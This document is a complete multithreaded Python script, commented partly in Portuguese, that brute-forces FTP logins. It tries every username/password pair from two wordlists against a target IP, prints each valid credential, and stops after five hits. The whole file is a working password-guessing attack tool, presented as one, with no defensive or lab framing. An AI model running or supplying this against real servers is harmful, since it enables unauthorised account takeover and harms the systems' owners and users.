import ftplib
import threading
import queue as q
import argparse
import time

# Variável global para contar credenciais encontradas
found_credentials = 0
max_credentials = 5  # Número máximo de credenciais antes de parar

# Lock para proteger o acesso à variável global
credentials_lock = threading.Lock()
stop_event = threading.Event()  # Evento para sinalizar threads para parar

# Function to load the wordlist from a file
def load_wordlist(filename):
    with open(filename, 'r') as file:
        return [line.strip() for line in file.readlines()]

# Function to be executed by each thread
def worker(task_queue, target_ip):
    global found_credentials

    while not stop_event.is_set():  # Verifica se o evento de parada foi acionado
        try:
            user, password = task_queue.get_nowait()
        except q.Empty:
            break

        try:
            ftp = ftplib.FTP(target_ip)
            ftp.login(user, password)
            print(f"[+] Successful login: {user}:{password}")
            ftp.quit()

            with credentials_lock:
                found_credentials += 1
                if found_credentials >= max_credentials:
                    stop_event.set()  # Sinaliza para as threads pararem
                    break

        except ftplib.error_perm:
            print(f"[-] Failed login: {user}:{password}")
        except Exception as e:
            print(f"[!] Error: {e}")
        task_queue.task_done()

# Main function to set up and execute threads
def ftp_brute_force(target_ip, user_list, pass_list, num_threads):
    task_queue = q.Queue()

    for user in user_list:
        for password in pass_list:
            task_queue.put((user, password))

    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=worker, args=(task_queue, target_ip))
        t.start()
        threads.append(t)

    # Esperar até que o evento de parada seja acionado ou a fila de tarefas seja vazia
    while not stop_event.is_set() and not task_queue.empty():
        time.sleep(0.1)

    # Parar todas as threads restantes
    for t in threads:
        if t.is_alive():
            t.join()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='FTP Brute Force Script')
    parser.add_argument('target_ip', help='Target IP address')
    parser.add_argument('user_list', help='Path to the username file')
    parser.add_argument('pass_list', help='Path to the password file')
    parser.add_argument('--threads', type=int, default=4, help='Number of threads (default: 4)')

    args = parser.parse_args()

    user_list = load_wordlist(args.user_list)
    pass_list = load_wordlist(args.pass_list)

    start_time = time.time()
    ftp_brute_force(args.target_ip, user_list, pass_list, args.threads)
    end_time = time.time()

    print(f"[+] Attack completed in {end_time - start_time:.2f} seconds.")
